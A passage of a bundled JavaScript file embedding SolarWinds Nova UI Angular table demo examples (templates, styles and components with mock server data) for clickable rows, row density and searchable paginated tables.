    ],\n            asset: "Workstation",\n            location: "Brno",\n            status: "status_up",\n            outages: 58,\n            checks: [\n                {\n                    icon: "status_critical",\n                    num: 25,\n                },\n            ],\n        },\n        {\n            position: 3,\n            name: "FOCUS-SVR-02258",\n            features: [\n                "remote-access-vpn-tunnel",\n                "tools",\n                "database",\n                "orion-ape-backup",\n                "patch-manager01",\n            ],\n            asset: "Workstation",\n            location: "Brno",\n            status: "status_up",\n            outages: 7,\n            checks: [\n                {\n                    icon: "status_down",\n                    num: 25,\n                },\n            ],\n        },\n        {\n            position: 4,\n            name: "Man-LT-JYJ4AD5",\n            features: [\n                "remote-access-vpn-tunnel",\n                "tools",\n                "database",\n                "orion-ape-backup",\n                "patch-manager01",\n            ],\n            asset: "Workstation",\n            location: "Brno",\n            status: "status_up",\n            outages: 15,\n            checks: [\n                {\n                    icon: "status_up",\n                    num: 25,\n                },\n            ],\n        },\n        {\n            position: 5,\n            name: "Man-LT-JYJ4AD5",\n            features: [\n                "remote-access-vpn-tunnel",\n                "tools",\n                "database",\n                "orion-ape-backup",\n                "patch-manager01",\n            ],\n            asset: "Workstation",\n            location: "Brno",\n            status: "status_up",\n            outages: 11,\n            checks: [\n                {\n                    icon: "status_up",\n                    num: 25,\n                },\n            ],\n        },\n    ];\n}\n'},31415:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="nui-table__container" id="nui-demo-table-select">\n    <table\n        nui-table\n        [dataSource]="dataSource"\n        [(selection)]="selection"\n        [selectionConfig]="selectionConfig"\n        [trackBy]="trackBy"\n    >\n        <ng-container nuiColumnDef="position">\n            <th nui-header-cell *nuiHeaderCellDef i18n>No.</th>\n            <td nui-cell *nuiCellDef="let element">{{ element.position }}</td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="description">\n            <th nui-header-cell *nuiHeaderCellDef i18n>Description</th>\n            <td\n                nui-cell\n                *nuiCellDef="let element"\n                [tooltipText]="element.description"\n            >\n                {{ element.description }}\n            </td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="status" type="icon">\n            <th nui-header-cell *nuiHeaderCellDef>\n                <div class="d-flex align-items-center">\n                    <nui-icon [icon]="\'enable\'"></nui-icon>\n                </div>\n            </th>\n            <td nui-cell *nuiCellDef="let element">\n                <div class="d-flex align-items-center">\n                    <nui-icon [icon]="element.status"></nui-icon>\n                </div>\n            </td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="location">\n            <th nui-header-cell *nuiHeaderCellDef i18n>Location</th>\n            <td nui-cell *nuiCellDef="let element">\n                <a\n                    href="https://maps.google.com/?q={{ element.location }}"\n                    target="_blank"\n                    >{{ element.location }}</a\n                >\n            </td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="actions">\n            <th nui-header-cell *nuiHeaderCellDef>Actions</th>\n            <td nui-cell *nuiCellDef="let element">\n                <button nui-button type="button">Reply</button>\n                <button nui-button type="button">Forward</button>\n            </td>\n        </ng-container>\n\n        <tr nui-header-row *nuiHeaderRowDef="displayedColumns"></tr>\n        <tr\n            nui-row\n            *nuiRowDef="let row; columns: displayedColumns"\n            [rowObject]="row"\n            [clickableRow]="true"\n        ></tr>\n    </table>\n</div>\n<h2>Selection result</h2>\n<div class="flex-row-container">\n    <span class="flex-independent-row-item">\n        {{ selection | json }}\n    </span>\n</div>\n'},57999:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { AfterViewInit, Component, OnDestroy } from "@angular/core";\nimport { Subscription } from "rxjs";\n\nimport {\n    ClientSideDataSource,\n    INovaFilteringOutputs,\n    ISelection,\n    SelectorService,\n    TableSelectionConfig,\n    TableSelectionMode,\n} from "@nova-ui/bits";\n\ninterface IExampleTableModel {\n    position: number;\n    description: string;\n    status: string;\n    location: string;\n}\n\n@Component({\n    selector: "nui-table-row-clickable",\n    providers: [ClientSideDataSource],\n    templateUrl: "./table-row-clickable.example.component.html",\n})\nexport class TableRowClickableExampleComponent\n    implements AfterViewInit, OnDestroy\n{\n    public displayedColumns = [\n        "position",\n        "description",\n        "status",\n        "location",\n        "actions",\n    ];\n    public dataSource?: IExampleTableModel[] = [];\n    public selectedItems: IExampleTableModel[] = [];\n    public selection: ISelection = {\n        isAllPages: false,\n        include: [2, 3],\n        exclude: [],\n    };\n    public selectionConfig: TableSelectionConfig = {\n        enabled: true,\n        selectionMode: TableSelectionMode.Multi,\n    };\n\n    private outputsSubscription: Subscription;\n\n    constructor(\n        public dataSourceService: ClientSideDataSource<IExampleTableModel>,\n        public selectorService: SelectorService\n    ) {}\n\n    public ngAfterViewInit(): void {\n        this.outputsSubscription =\n            this.dataSourceService.outputsSubject.subscribe(\n                (data: INovaFilteringOutputs) => {\n                    this.dataSource = data.repeat?.itemsSource;\n                }\n            );\n        this.applyFilters();\n    }\n\n    public applyFilters(): void {\n        this.dataSourceService.setData(getData());\n        this.dataSourceService.applyFilters();\n    }\n\n    public ngOnDestroy(): void {\n        this.outputsSubscription.unsubscribe();\n    }\n\n    public trackBy(index: number, item: IExampleTableModel): number {\n        return item.position;\n    }\n}\n\n/** Table data */\nfunction getData(): IExampleTableModel[] {\n    return [\n        {\n            position: 1,\n            description:\n                "Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua.",\n            status: "status_inactive",\n            location: "Brno",\n        },\n        {\n            position: 2,\n            description: "Sed ut perspiciatis unde omnis iste natus error sit.",\n            status: "status_up",\n            location: "Brno",\n        },\n        {\n            position: 3,\n            description:\n                "Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.",\n            status: "status_up",\n            location: "Brno",\n        },\n        {\n            position: 4,\n            description:\n                "Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur.",\n            status: "status_up",\n            location: "Brno",\n        },\n        {\n            position: 5,\n            description:\n                "Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.",\n            status: "status_up",\n            location: "Brno",\n        },\n        {\n            position: 6,\n            description:\n                "Nemo enim ipsam voluptatem quia voluptas sit aspernatur aut odit aut fugit.",\n            status: "status_up",\n            location: "Brno",\n        },\n        {\n            position: 7,\n            description:\n                "Neque porro quisquam est, qui dolorem ipsum quia dolor sit amet, consectetur.",\n            status: "status_up",\n            location: "Brno",\n        },\n        {\n            position: 8,\n            description:\n                "Ut enim ad minima veniam, quis nostrum exercitationem ullam corporis suscipit laboriosam, nisi ut aliquid ex ea commodi consequatur.",\n            status: "status_up",\n            location: "Brno",\n        },\n        {\n            position: 9,\n            description:\n                "Quis autem vel eum iure reprehenderit qui in ea voluptate.",\n            status: "status_up",\n            location: "Brno",\n        },\n        {\n            position: 10,\n            description:\n                "At vero eos et accusamus et iusto odio dignissimos ducimus qui blanditiis praesentium voluptatum deleniti atque corrupti.",\n            status: "status_up",\n            location: "Brno",\n        },\n    ];\n}\n'},26033:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="nui-table__container" id="nui-demo-table-row-height-set">\n    <table nui-table [dataSource]="dataSource">\n        <ng-container nuiColumnDef="position">\n            <th nui-header-cell *nuiHeaderCellDef i18n>No.</th>\n            <td nui-cell *nuiCellDef="let element">{{ element.position }}</td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="name">\n            <th nui-header-cell *nuiHeaderCellDef i18n>Name</th>\n            <td nui-cell *nuiCellDef="let element">{{ element.name }}</td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="features">\n            <th nui-header-cell *nuiHeaderCellDef i18n>Features</th>\n            <td nui-cell *nuiCellDef="let element">\n                <div class="d-flex align-items-center">\n                    <nui-icon\n                        *ngFor="let icon of element.features"\n                        [icon]="icon"\n                        class="icon-margin"\n                    >\n                    </nui-icon>\n                </div>\n            </td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="asset">\n            <th nui-header-cell *nuiHeaderCellDef i18n>Asset Class</th>\n            <td nui-cell *nuiCellDef="let element">{{ element.asset }}</td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="location">\n            <th nui-header-cell *nuiHeaderCellDef i18n>Location</th>\n            <td nui-cell *nuiCellDef="let element">{{ element.location }}</td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="status" type="icon">\n            <th nui-header-cell *nuiHeaderCellDef i18n>Status</th>\n            <td nui-cell *nuiCellDef="let element">\n                <div class="d-flex align-items-center justify-content-center">\n                    <nui-icon [icon]="element.status"></nui-icon>\n                </div>\n            </td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="outages">\n            <th nui-header-cell *nuiHeaderCellDef i18n>Outages</th>\n            <td nui-cell *nuiCellDef="let element">{{ element.outages }}</td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="checks">\n            <th nui-header-cell *nuiHeaderCellDef i18n>Checks</th>\n            <td nui-cell *nuiCellDef="let element">\n                <div class="d-flex align-items-center">\n                    <ng-container *ngFor="let check of element.checks">\n                        <nui-icon [icon]="check.icon"></nui-icon>\n                        <div class="ml-2">{{ check.num }}</div>\n                    </ng-container>\n                </div>\n            </td>\n        </ng-container>\n\n        <tr\n            nui-header-row\n            *nuiHeaderRowDef="displayedColumns"\n            [density]="density"\n        ></tr>\n        <tr\n            nui-row\n            *nuiRowDef="let row; columns: displayedColumns"\n            [density]="density"\n        ></tr>\n    </table>\n</div>\n'},79837:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t=".icon-margin {\n    margin-right: 5px;\n}\n"},30205:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { ChangeDetectionStrategy, Component, Input } from "@angular/core";\n\ninterface IExampleTableModel {\n    position: number;\n    name: string;\n    features: any;\n    asset: string;\n    location: string;\n    status: string;\n    outages: number;\n    checks: any;\n}\n\n@Component({\n    selector: "nui-table-row-height-set",\n    templateUrl: "./table-row-height-set.example.component.html",\n    styleUrls: ["./table-row-height-set.example.component.less"],\n    changeDetection: ChangeDetectionStrategy.OnPush,\n})\nexport class TableRowHeightSetExampleComponent {\n    public displayedColumns = [\n        "position",\n        "name",\n        "features",\n        "asset",\n        "location",\n        "status",\n        "outages",\n        "checks",\n    ];\n    public dataSource = getData();\n    @Input() density: string = "tiny";\n}\n\n/** Table data */\nfunction getData(): IExampleTableModel[] {\n    return [\n        {\n            position: 1,\n            name: "FOCUS-SVR-02258",\n            features: [\n                "remote-access-vpn-tunnel",\n                "tools",\n                "database",\n                "orion-ape-backup",\n                "patch-manager01",\n            ],\n            asset: "Workstation",\n            location: "Brno",\n            status: "status_up",\n            outages: 9,\n            checks: [\n                {\n                    icon: "status_up",\n                    num: 25,\n                },\n            ],\n        },\n        {\n            position: 2,\n            name: "Man-LT-JYJ4AD5",\n            features: [\n                "remote-access-vpn-tunnel",\n                "tools",\n                "database",\n                "orion-ape-backup",\n                "patch-manager01",\n            ],\n            asset: "Workstation",\n            location: "Brno",\n            status: "status_up",\n            outages: 95,\n            checks: [\n                {\n                    icon: "status_critical",\n                    num: 25,\n                },\n            ],\n        },\n        {\n            position: 3,\n            name: "FOCUS-SVR-02258",\n            features: [\n                "remote-access-vpn-tunnel",\n                "tools",\n                "database",\n                "orion-ape-backup",\n                "patch-manager01",\n            ],\n            asset: "Workstation",\n            location: "Brno",\n            status: "status_up",\n            outages: 45,\n            checks: [\n                {\n                    icon: "status_down",\n                    num: 25,\n                },\n            ],\n        },\n        {\n            position: 4,\n            name: "Man-LT-JYJ4AD5",\n            features: [\n                "remote-access-vpn-tunnel",\n                "tools",\n                "database",\n                "orion-ape-backup",\n                "patch-manager01",\n            ],\n            asset: "Workstation",\n            location: "Brno",\n            status: "status_up",\n            outages: 85,\n            checks: [\n                {\n                    icon: "status_up",\n                    num: 25,\n                },\n            ],\n        },\n        {\n            position: 5,\n            name: "Man-LT-JYJ4AD5",\n            features: [\n                "remote-access-vpn-tunnel",\n                "tools",\n                "database",\n                "orion-ape-backup",\n                "patch-manager01",\n            ],\n            asset: "Workstation",\n            location: "Brno",\n            status: "status_up",\n            outages: 33,\n            checks: [\n                {\n                    icon: "status_up",\n                    num: 25,\n                },\n            ],\n        },\n    ];\n}\n'},42179:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="nui-table__container" id="nui-demo-searchable-table">\n    <div class="nui-searchable-table__search">\n        <nui-search\n            id="nui-demo-searchable-table-search"\n            [value]="searchTerm"\n            (search)="onSearch($event)"\n            (cancel)="onSearchCancel()"\n            #filteringSearch\n        >\n        </nui-search>\n    </div>\n    <table\n        nui-table\n        [dataSource]="dataSource"\n        [selectionConfig]="selectionConfig"\n        [(selection)]="selection"\n        [totalItems]="paginationTotal"\n        [trackBy]="trackBy"\n        #filteringTable\n    >\n        <ng-container nuiColumnDef="position">\n            <th nui-header-cell *nuiHeaderCellDef i18n>No.</th>\n            <td nui-cell *nuiCellDef="let element">{{ element.position }}</td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="name">\n            <th nui-header-cell *nuiHeaderCellDef i18n>Name</th>\n            <td nui-cell *nuiCellDef="let element">{{ element.name }}</td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="features">\n            <th nui-header-cell *nuiHeaderCellDef i18n>Features</th>\n            <td nui-cell *nuiCellDef="let element">\n                <nui-icon\n                    *ngFor="let icon of element.features"\n                    [icon]="icon"\n                    class="icon-margin"\n                ></nui-icon>\n            </td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="asset">\n            <th nui-header-cell *nuiHeaderCellDef i18n>Asset Class</th>\n            <td nui-cell *nuiCellDef="let element">{{ element.asset }}</td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="location">\n            <th nui-header-cell *nuiHeaderCellDef i18n>Location</th>\n            <td nui-cell *nuiCellDef="let element">{{ element.location }}</td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="status">\n            <th nui-header-cell *nuiHeaderCellDef i18n>Status</th>\n            <td nui-cell *nuiCellDef="let element">{{ element.status }}</td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="outages">\n            <th nui-header-cell *nuiHeaderCellDef i18n>Outages</th>\n            <td nui-cell *nuiCellDef="let element">{{ element.outages }}</td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="checks">\n            <th nui-header-cell *nuiHeaderCellDef i18n>Checks</th>\n            <td nui-cell *nuiCellDef="let element">\n                <ng-container *ngFor="let check of element.checks">\n                    <nui-icon [icon]="check.icon"></nui-icon>\n                    {{ check.num }}\n                </ng-container>\n            </td>\n        </ng-container>\n\n        <tr nui-header-row *nuiHeaderRowDef="displayedColumns"></tr>\n        <tr\n            nui-row\n            *nuiRowDef="let row; columns: displayedColumns"\n            [rowObject]="row"\n            [clickableRow]="true"\n        ></tr>\n    </table>\n</div>\n<nui-paginator\n    id="nui-demo-table-select-paginator"\n    [page]="1"\n    [pageSize]="10"\n    [total]="paginationTotal"\n    activeClass="active"\n    disabledClass="disabled"\n    showPrevNext="true"\n    (pagerAction)="changePagination($event)"\n    #filteringPaginator\n>\n</nui-paginator>\n<h2>Selection result</h2>\n<div class="flex-row-container">\n    <span class="flex-independent-row-item">\n        {{ selection | json }}\n    </span>\n</div>\n'},74311:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t=".nui-searchable-table__search {\n    max-width: 350px;\n    margin-bottom: 5px;\n    margin-left: auto;\n}\n"},96219:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { AfterViewInit, Component, OnDestroy, ViewChild } from "@angular/core";\nimport { Subscription } from "rxjs";\nimport { debounceTime } from "rxjs/operators";\n\nimport {\n    ClientSideDataSource,\n    INovaFilteringOutputs,\n    ISelection,\n    PaginatorComponent,\n    SearchComponent,\n    TableComponent,\n    TableSelectionConfig,\n    TableSelectionMode,\n} from "@nova-ui/bits";\n\ninterface IExampleTableModel {\n    position: number;\n    name: string;\n    features: any;\n    asset: string;\n    location: string;\n    status: string;\n    outages: number;\n    checks: any;\n}\n\n@Component({\n    selector: "nui-table-search-with-select-and-pagination",\n    providers: [ClientSideDataSource],\n    templateUrl:\n        "./table-search-with-select-and-pagination.example.component.html",\n    styleUrls: [\n        "./table-search-with-select-and-pagination.example.component.less",\n    ],\n})\nexport class TableSearchWithSelectAndPaginationComponent\n    implements AfterViewInit, OnDestroy\n{\n    public displayedColumns = [\n        "position",\n        "name",\n        "features",\n        "asset",\n        "location",\n        "status",\n        "outages",\n        "checks",\n    ];\n    public dataSource: any = [];\n    public paginationTotal?: number;\n    public searchTerm: string;\n    public selection: ISelection = {\n        isAllPages: false,\n        include: [],\n        exclude: [],\n    };\n    public selectionConfig: TableSelectionConfig = {\n        enabled: true,\n        selectionMode: TableSelectionMode.Multi,\n    };\n    @ViewChild("filteringPaginator") filteringPaginator: PaginatorComponent;\n    @ViewChild("filteringSearch") filteringSearch: SearchComponent;\n    @ViewChild("filteringTable")\n    filteringTable: TableComponent<IExampleTableModel>;\n\n    private outputsSubscription: Subscription;\n    private searchSubscription: Subscription;\n\n    constructor(\n        public dataSourceService: ClientSideDataSource<IExampleTableModel>\n    ) {\n        dataSourceService.setData(getData());\n    }\n\n    public ngAfterViewInit(): void {\n        this.dataSourceService.componentTree = {\n            search: {\n                componentInstance: this.filteringSearch,\n            },\n            paginator: {\n                componentInstance: this.filteringPaginator,\n            },\n        };\n        this.outputsSubscription =\n            this.dataSourceService.outputsSubject.subscribe(\n                (data: INovaFilteringOutputs) => {\n                    this.dataSource = data.repeat?.itemsSource;\n                    this.paginationTotal = data.paginator?.total;\n                }\n            );\n        this.searchSubscription = this.filteringSearch.inputChange\n            .pipe(debounceTime(500))\n            .subscribe(() => {\n                this.onSearch(undefined);\n            });\n\n        this.dataSourceService.applyFilters();\n    }\n\n    public onSearch(value?: string): void {\n        this.dataSourceService.applyFilters();\n    }\n\n    public onSearchCancel(): void {\n        this.dataSourceService.applyFilters();\n    }\n\n    public changePagination($event: any): void {\n        this.dataSourceService.applyFilters();\n    }\n\n    public trackBy(index: number, item: IExampleTableModel): number {\n        return item.position;\n    }\n\n    public ngOnDestroy(): void {\n        this.searchSubscription.unsubscribe();\n        this.outputsSubscription.unsubscribe();\n    }\n}\n\n/** Table data */\nfunction getData(): IExampleTableModel[] {\n    return [\n        {\n            position: 1,\n            name: "FOCUS-SVR-02258",\n            features: [\n                "remote-access-vpn-tunnel",\n                "tools",\n                "database",\n                "orion-ape-backup",\n                "patch-manager01",\n            ],\n            asset: "Workstation",\n            location: "Brno",\n            status: "Active",\n            outages: 90,\n            checks: [\n                {\n                    icon: "status_up",\n                    num: 25,\n                },\n            ],\n        },\n        {\n            position: 2,\n            name: "Man-LT-JYJ4AD5",\n            features: [\n                "remote-access-vpn-tunnel",\n                "tools",\n                "database",\n                "orion-ape-backup",\n                "patch-manager01",\n            ],\n            asset: "Workstation",\n            location: "Brno",\n            status: "Active",\n            outages: 9,\n            checks: [\n                {\n                    icon: "status_critical",\n                    num: 25,\n                },\n            ],\n        },\n        {\n            position: 3,\n            name: "FOCUS-SVR-02258",\n            features: [\n                "remote-access-vpn-tunnel",\n                "tools",\n                "database",\n                "orion-ape-backup",\n                "patch-manager01",\n            ],\n            asset: "Workstation",\n            location: "Brno",\n            status: "Active",\n            outages: 17,\n            checks: [\n                {\n                    icon: "status_down",\n                    num: 25,\n                },\n            ],\n        },\n        {\n            position: 4,\n            name: "Man-ATFLT-BRNO1",\n            features: [\n                "remote-access-vpn-tunnel",\n                "tools",\n                "database",\n                "orion-ape-backup",\n                "patch-manager01",\n            ],\n            asset: "Workstation",\n            location: "Austin",\n            status: "Active",\n            outages: 3,\n            checks: [\n                {\n                    icon: "status_up",\n                    num: 25,\n                },\n            ],\n        },\n        {\n            position: 5,\n            name: "Man-LTF-JYAF75J4AD5",\n            features: [\n                "remote-access-vpn-tunnel",\n                "tools",\n                "database",\n                "orion-ape-backup",\n                "patch-manager01",\n            ],\n            asset: "Workstation",\n            location: "Austin",\n            status: "Active",\n            outages: 56,\n            checks: [\n                {\n                    icon: "status_up",\n                    num: 25,\n                },\n            ],\n        },\n        {\n            position: 6,\n            name: "Man-LTF-JYAF75J4AD5",\n            features: [\n                "remote-access-vpn-tunnel",\n                "tools",\n                "database",\n                "orion-ape-backup",\n                "patch-manager01",\n            ],\n            asset: "Workstation",\n            location: "Kyiv",\n            status: "Active",\n            outages: 52,\n            checks: [\n                {\n                    icon: "status_up",\n                    num: 28,\n                },\n            ],\n        },\n        {\n            position: 7,\n            name: "Man-LTF-JYAF75J4AD5",\n            features: [\n                "remote-access-vpn-tunnel",\n                "tools",\n                "database",\n                "orion-ape-backup",\n                "patch-manager01",\n            ],\n            asset: "Workstation",\n            location: "Paris",\n            status: "Active",\n            outages: 12,\n            checks: [\n                {\n                    icon: "status_up",\n                    num: 32,\n                },\n            ],\n        },\n        {\n            position: 8,\n            name: "FOCUS-SVR-02258",\n            features: [\n                "remote-access-vpn-tunnel",\n                "tools",\n                "database",\n                "orion-ape-backup",\n                "patch-manager01",\n            ],\n            asset: "Workstation",\n            location: "Kyiv",\n            status: "Active",\n            outages: 11,\n            checks: [\n                {\n                    icon: "status_up",\n                    num: 10,\n                },\n            ],\n        },\n        {\n            position: 9,\n            name: "FOCUS-SVR-02258",\n            features: [\n                "remote-access-vpn-tunnel",\n                "tools",\n                "database",\n                "orion-ape-backup",\n                "patch-manager01",\n            ],\n            asset: "Workstation",\n            location: "Berlin",\n            status: "Active",\n            outages: 79,\n            checks: [\n                {\n                    icon: "status_up",\n                    num: 43,\n                },\n            ],\n        },\n        {\n            position: 10,\n            name: "FOCUS-SVR-02258",\n            features: [\n                "remote-access-vpn-tunnel",\n                "tools",\n                "database",\n                "orion-ape-backup",\n                "patch-manager01",\n            ],\n            asset: "Workstation",\n            location: "Brno",\n            status: "Active",\n            outages: 8,\n            checks: [\n                {\n                    icon: "status_critical",\n                    num: 12,\n                },\n            ],\n        },\n        {\n            position: 11,\n            name: "FOCUS-SVR-02258",\n            features: [\n                "remote-access-vpn-tunnel",\n                "tools",\n                "database",\n                "orion-ape-backup",\n                "patch-manager01",\n            ],\n            asset: "Workstation",\n            location: "Paris",\n            status: "Active",\n            outages: 10,\n            checks: [\n                {\n                    icon: "status_critical",\n                    num: 12,\n                },\n            ],\n        },\n        {\n            position: 12,\n            name: "FOCUS-SVR-02258",\n            features: [\n                "remote-access-vpn-tunnel",\n                "tools",\n                "database",\n                "orion-ape-backup",\n                "patch-manager01",\n            ],\n            asset: "Workstation",\n            location: "Amsterdam",\n            status: "Active",\n            outages: 22,\n            checks: [\n                {\n                    icon: "status_up",\n                    num: 32,\n                },\n            ],\n        },\n    ];\n}\n'},32183:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="nui-table__container" id="nui-demo-searchable-table">\n    <nui-checkbox\n        (valueChange)="applySearchField()"\n        id="nui-demo-searchable-table-checkbox"\n        >Enable searching only by location</nui-checkbox\n    >\n    <div class="nui-searchable-table__search">\n        <nui-search\n            id="nui-demo-searchable-table-search"\n            [value]="searchTerm"\n            (search)="onSearch($event)"\n            (cancel)="onSearchCancel()"\n            #filteringSearch\n        >\n        </nui-search>\n    </div>\n    <table nui-table [dataSource]="dataSource" #filteringTable>\n        <ng-container nuiColumnDef="position">\n            <th nui-header-cell *nuiHeaderCellDef i18n>No.</th>\n            <td nui-cell *nuiCellDef="let element">{{ element.position }}</td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="name">\n            <th nui-header-cell *nuiHeaderCellDef i18n>Name</th>\n            <td nui-cell *nuiCellDef="let element">{{ element.name }}</td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="features">\n            <th nui-header-cell *nuiHeaderCellDef i18n>Features</th>\n            <td nui-cell *nuiCellDef="let element">\n                <nui-icon\n                    *ngFor="let icon of element.features"\n                    [icon]="icon"\n                    class="icon-margin"\n                ></nui-icon>\n            </td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="asset">\n            <th nui-header-cell *nuiHeaderCellDef i18n>Asset Class</th>\n            <td nui-cell *nuiCellDef="let element">{{ element.asset }}</td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="location">\n            <th nui-header-cell *nuiHeaderCellDef i18n>Location</th>\n            <td nui-cell *nuiCellDef="let element">{{ element.location }}</td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="status">\n            <th nui-header-cell *nuiHeaderCellDef i18n>Status</th>\n            <td nui-cell *nuiCellDef="let element">{{ element.status }}</td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="outages">\n            <th nui-header-cell *nuiHeaderCellDef i18n>Outages</th>\n            <td nui-cell *nuiCellDef="let element">{{ element.outages }}</td>\n        </ng-container>\n\n        <ng-container nuiColumnDef="checks">\n            <th nui-header-cell *nuiHeaderCellDef i18n>Checks</th>\n            <td nui-cell *nuiCellDef="let element">\n                <ng-container *ngFor="let check of element.checks">\n                    <nui-icon [icon]="check.icon"></nui-icon>\n                    {{ check.num }}\n                </ng-container>\n            </td>\n        </ng-container>\n\n        <tr nui-header-row *nuiHeaderRowDef="displayedColumns"></tr>\n        <tr nui-row *nuiRowDef="let row; columns: displayedColumns"></tr>\n    </table>\n</div>\n'},18211:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t=".nui-searchable-table__search {\n    max-width: 350px;\n    margin-bottom: 5px;\n    margin-left: auto;\n}\n"},49871:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE 